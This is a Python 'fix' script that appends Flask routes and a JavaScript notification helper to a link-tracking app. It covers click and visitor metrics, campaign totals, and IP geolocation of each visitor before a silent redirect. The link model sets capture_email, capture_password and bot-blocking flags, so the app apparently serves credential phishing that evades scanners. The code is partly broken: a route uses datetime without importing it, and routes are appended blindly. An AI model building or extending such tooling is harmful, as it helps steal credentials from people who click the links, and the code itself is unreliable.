#!/usr/bin/env python3
"""
Fix for Tracking Links Metrics Display Issue
============================================

This script fixes the specific issue where tracking links show incorrect metrics:
- Clicks vs Visitors mismatch
- Campaign data not updating properly
- Link regeneration failures
- Live activity location inaccuracies
"""

import os
import sys
from pathlib import Path

def fix_tracking_metrics_api():
    """Fix the API endpoint for accurate tracking metrics"""
    
    # Enhanced metrics calculation for backend
    tracking_metrics_fix = '''
from flask import jsonify
from sqlalchemy import func, distinct
from src.models.tracking_event import TrackingEvent
from src.models.link import Link

@links_bp.route('/<int:link_id>/metrics')
def get_link_metrics(link_id):
    """Get accurate metrics for a specific link"""
    try:
        # Get the link
        link = Link.query.get_or_404(link_id)
        
        # Calculate total clicks (all tracking events for this link)
        total_clicks = TrackingEvent.query.filter_by(link_id=link_id).count()
        
        # Calculate unique visitors (distinct IP addresses)
        unique_visitors = TrackingEvent.query\\
            .filter_by(link_id=link_id)\\
            .with_entities(func.count(distinct(TrackingEvent.ip_address)))\\
            .scalar() or 0
            
        # Calculate visitors who reached landing page
        conversions = TrackingEvent.query\\
            .filter_by(link_id=link_id, landing_page_reached=True)\\
            .count()
            
        # Calculate conversion rate
        conversion_rate = (conversions / unique_visitors * 100) if unique_visitors > 0 else 0
        
        # Get recent activity (last 24 hours)
        from datetime import datetime, timedelta
        recent_cutoff = datetime.utcnow() - timedelta(hours=24)
        recent_clicks = TrackingEvent.query\\
            .filter_by(link_id=link_id)\\
            .filter(TrackingEvent.timestamp >= recent_cutoff)\\
            .count()
            
        return jsonify({
            'link_id': link_id,
            'total_clicks': total_clicks,
            'unique_visitors': unique_visitors,
            'conversions': conversions,
            'conversion_rate': round(conversion_rate, 1),
            'recent_clicks_24h': recent_clicks,
            'click_to_visitor_ratio': round((total_clicks / unique_visitors), 2) if unique_visitors > 0 else 0
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@links_bp.route('/<int:link_id>/regenerate', methods=['POST'])
def regenerate_link(link_id):
    """Regenerate a tracking link with new short URL"""
    try:
        link = Link.query.get_or_404(link_id)
        
        # Generate new short URL using the shortening service
        from src.services.url_shortener import generate_short_url
        new_short_url = generate_short_url(link.target_url)
        
        # Update the link
        link.short_url = new_short_url
        link.updated_at = datetime.utcnow()
        
        db.session.commit()
        
        return jsonify({
            'success': True,
            'new_short_url': new_short_url,
            'message': 'Link regenerated successfully'
        })
        
    except Exception as e:
        db.session.rollback()
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500
'''

    # Write to links.py route file
    links_route_file = Path("/home/user/current-repo/src/routes/links.py")
    
    if links_route_file.exists():
        with open(links_route_file, 'a') as f:
            f.write('\n\n# Enhanced metrics and regeneration endpoints\n')
            f.write(tracking_metrics_fix)
        print("✅ Added enhanced metrics and regeneration endpoints to links.py")
    else:
        print("❌ links.py route file not found")

def fix_campaign_integration():
    """Fix campaign integration with tracking links"""
    
    campaign_integration_fix = '''
@campaigns_bp.route('/<int:campaign_id>/links')
def get_campaign_links(campaign_id):
    """Get all links associated with a campaign"""
    try:
        # Get campaign
        campaign = Campaign.query.get_or_404(campaign_id)
        
        # Get all links for this campaign
        links = Link.query.filter_by(campaign_name=campaign.name).all()
        
        # Calculate campaign metrics
        total_clicks = 0
        total_visitors = 0
        
        for link in links:
            link_clicks = TrackingEvent.query.filter_by(link_id=link.id).count()
            link_visitors = TrackingEvent.query\\
                .filter_by(link_id=link.id)\\
                .with_entities(func.count(distinct(TrackingEvent.ip_address)))\\
                .scalar() or 0
            
            total_clicks += link_clicks
            total_visitors += link_visitors
        
        # Update campaign metrics
        campaign.total_clicks = total_clicks
        campaign.unique_visitors = total_visitors
        db.session.commit()
        
        return jsonify({
            'campaign_id': campaign_id,
            'campaign_name': campaign.name,
            'total_links': len(links),
            'total_clicks': total_clicks,
            'unique_visitors': total_visitors,
            'links': [{
                'id': link.id,
                'short_url': link.short_url,
                'target_url': link.target_url,
                'created_at': link.created_at.isoformat()
            } for link in links]
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@links_bp.route('/', methods=['POST'])
def create_link():
    """Enhanced link creation with proper campaign integration"""
    try:
        data = request.get_json()
        
        # Create new link
        new_link = Link(
            target_url=data['target_url'],
            campaign_name=data.get('campaign_name', ''),
            capture_email=data.get('capture_email', False),
            capture_password=data.get('capture_password', False),
            bot_blocking_enabled=data.get('bot_blocking_enabled', True),
            created_by=current_user.id,
            created_at=datetime.utcnow()
        )
        
        # Generate short URL
        from src.services.url_shortener import generate_short_url
        short_url = generate_short_url(data['target_url'])
        new_link.short_url = short_url
        
        db.session.add(new_link)
        
        # If campaign specified, ensure campaign exists or create it
        if data.get('campaign_name'):
            campaign = Campaign.query.filter_by(name=data['campaign_name']).first()
            if not campaign:
                campaign = Campaign(
                    name=data['campaign_name'],
                    created_by=current_user.id,
                    created_at=datetime.utcnow(),
                    total_clicks=0,
                    unique_visitors=0
                )
                db.session.add(campaign)
        
        db.session.commit()
        
        return jsonify({
            'success': True,
            'link': {
                'id': new_link.id,
                'short_url': new_link.short_url,
                'target_url': new_link.target_url,
                'campaign_name': new_link.campaign_name
            }
        })
        
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500
'''

    # Add to campaigns.py
    campaigns_route_file = Path("/home/user/current-repo/src/routes/campaigns.py")
    if campaigns_route_file.exists():
        with open(campaigns_route_file, 'a') as f:
            f.write('\n\n# Enhanced campaign integration\n')
            f.write(campaign_integration_fix)
        print("✅ Added enhanced campaign integration")

def fix_live_activity_location_tracking():
    """Fix live activity location tracking accuracy"""
    
    location_tracking_fix = '''
import requests
from flask import request
import geoip2.database
import geoip2.errors

def get_accurate_location(ip_address):
    """Get accurate location data for IP address"""
    try:
        # First try GeoIP2 database if available
        try:
            with geoip2.database.Reader('/path/to/GeoLite2-City.mmdb') as reader:
                response = reader.city(ip_address)
                return {
                    'country': response.country.name,
                    'region': response.subdivisions.most_specific.name,
                    'city': response.city.name,
                    'latitude': float(response.location.latitude) if response.location.latitude else None,
                    'longitude': float(response.location.longitude) if response.location.longitude else None,
                    'accuracy': 'high'
                }
        except (geoip2.errors.AddressNotFoundError, FileNotFoundError):
            pass
        
        # Fallback to IP-API service
        response = requests.get(f'http://ip-api.com/json/{ip_address}', timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data['status'] == 'success':
                return {
                    'country': data.get('country', 'Unknown'),
                    'region': data.get('regionName', 'Unknown'), 
                    'city': data.get('city', 'Unknown'),
                    'latitude': data.get('lat'),
                    'longitude': data.get('lon'),
                    'accuracy': 'medium'
                }
    except Exception as e:
        print(f"Location tracking error: {e}")
    
    return {
        'country': 'Unknown',
        'region': 'Unknown', 
        'city': 'Unknown',
        'latitude': None,
        'longitude': None,
        'accuracy': 'none'
    }

@track_bp.route('/<short_code>')
def track_click(short_code):
    """Enhanced click tracking with accurate location"""
    try:
        # Get the link
        link = Link.query.filter_by(short_url=short_code).first()
        if not link:
            return redirect('https://google.com')  # Fallback
        
        # Get client IP (handle proxies)
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()
        
        # Get accurate location
        location_data = get_accurate_location(client_ip)
        
        # Create tracking event
        tracking_event = TrackingEvent(
            link_id=link.id,
            ip_address=client_ip,
            user_agent=request.headers.get('User-Agent', ''),
            referer=request.headers.get('Referer', ''),
            country=location_data['country'],
            region=location_data['region'],
            city=location_data['city'],
            latitude=location_data['latitude'],
            longitude=location_data['longitude'],
            status='clicked',
            landing_page_reached=False,
            timestamp=datetime.utcnow()
        )
        
        db.session.add(tracking_event)
        db.session.commit()
        
        # Update status to 'redirected' after successful redirect
        tracking_event.status = 'redirected'
        db.session.commit()
        
        # Redirect to target
        return redirect(link.target_url)
        
    except Exception as e:
        print(f"Tracking error: {e}")
        return redirect(link.target_url if 'link' in locals() else 'https://google.com')
'''

    # Add to track.py
    track_route_file = Path("/home/user/current-repo/src/routes/track.py")
    if track_route_file.exists():
        with open(track_route_file, 'a') as f:
            f.write('\n\n# Enhanced location tracking\n')
            f.write(location_tracking_fix)
        print("✅ Added enhanced location tracking")

def fix_notification_timestamps():
    """Fix notification timestamps to show real-time updates"""
    
    notification_time_fix = '''
import { formatDistanceToNow } from 'date-fns'

export const formatNotificationTime = (timestamp) => {
  try {
    const date = new Date(timestamp)
    const now = new Date()
    const diffInMinutes = Math.floor((now - date) / (1000 * 60))
    
    if (diffInMinutes < 1) return 'Just now'
    if (diffInMinutes < 60) return `${diffInMinutes}m ago`
    if (diffInMinutes < 1440) return `${Math.floor(diffInMinutes / 60)}h ago`
    
    return formatDistanceToNow(date, { addSuffix: true })
  } catch (error) {
    return 'Unknown time'
  }
}

export const useRealTimeNotifications = () => {
  const [notifications, setNotifications] = useState([])
  const [lastUpdate, setLastUpdate] = useState(Date.now())
  
  useEffect(() => {
    const interval = setInterval(() => {
      setLastUpdate(Date.now())
    }, 30000) // Update every 30 seconds
    
    return () => clearInterval(interval)
  }, [])
  
  const fetchNotifications = async () => {
    try {
      const response = await fetch('/api/notifications', {
        headers: {
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        }
      })
      
      if (response.ok) {
        const data = await response.json()
        setNotifications(data.notifications || [])
      }
    } catch (error) {
      console.error('Error fetching notifications:', error)
    }
  }
  
  useEffect(() => {
    fetchNotifications()
    
    // Set up real-time updates
    const interval = setInterval(fetchNotifications, 60000) // Every minute
    return () => clearInterval(interval)
  }, [])
  
  return { notifications, lastUpdate, refresh: fetchNotifications }
}
'''

    # Write notification utilities
    notification_utils_file = Path("/home/user/current-repo/src/utils/notifications.js")
    notification_utils_file.parent.mkdir(exist_ok=True)
    
    with open(notification_utils_file, 'w') as f:
        f.write(notification_time_fix)
    print("✅ Created real-time notification utilities")

def run_tracking_fixes():
    """Run all tracking-related fixes"""
    print("🔧 Fixing Tracking Metrics Issues...")
    print("=" * 40)
    
    fix_tracking_metrics_api()
    fix_campaign_integration()
    fix_live_activity_location_tracking()
    fix_notification_timestamps()
    
    print("\n✅ All tracking metrics fixes completed!")

if __name__ == "__main__":
    run_tracking_fixes()